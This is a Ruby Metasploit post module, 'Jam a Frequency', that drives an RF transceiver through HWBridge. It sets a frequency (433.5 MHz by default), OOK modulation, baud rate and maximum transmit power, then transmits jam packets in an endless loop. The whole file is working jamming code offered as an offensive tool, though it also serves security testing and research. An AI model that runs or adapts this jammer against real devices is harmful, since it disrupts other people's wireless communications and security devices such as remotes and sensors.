class MetasploitModule < Msf::Post

  include Msf::Post::Hardware::RFTransceiver::RFTransceiver

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Jam a Frequency',
        'Description'   => %q{ Post Module for HWBridge RFTranscievers. Jams a frequency by just sending crap,
                               really loudly.
        },
        'References'     =>
        [
          ['URL', 'https://github.com/AndrewMohawk/RfCatHelpers'],
          ['URL', 'https://github.com/leonjza/ooktools']
        ],
        'License'       => MSF_LICENSE,
        'Author'        => ['Leon Jacobs'],
        'Platform'      => ['hardware'],
        'SessionTypes'  => ['hwbridge']
      ))
    register_options([
      OptInt.new('FREQ', [true, "Frequency to jam", 433500000]),
      OptInt.new('BAUD', [false, "Baud rate to use", 2000]),
      OptString.new('DATA', [false, "Specify the data to send as the jam", "0xFFFFFFFF"]),
      OptInt.new('INDEX', [false, "USB Index to use", 0]),
      OptBool.new('LOUD', [false, "Make the radio extra loud", true])
    ], self.class)
  end

  def run
    if not is_rf?
      print_error("Not an RF Transceiver")
      return
    end
    if not set_index(datastore['INDEX'])
      print_error("Couldn't set usb index to #{datastore["INDEX"]}")
      return
    end

    set_freq(datastore["FREQ"])
    set_modulation("ASK/OOK")
    set_sync_mode(0)
    set_baud(datastore["BAUD"])

    # prepare the packet
    set_flen(datastore["DATA"].length)

    if datastore["LOUD"]
      max_power
      print_status("Set the radio to max power") if datastore["VERBOSE"]
    end

    # Transmit
    print_good("Transmitting jam packets... ^C to stop")

    loop do
      rfxmit(datastore["DATA"])
    end

    print_status("Done")
    set_mode("IDLE")
  end

end
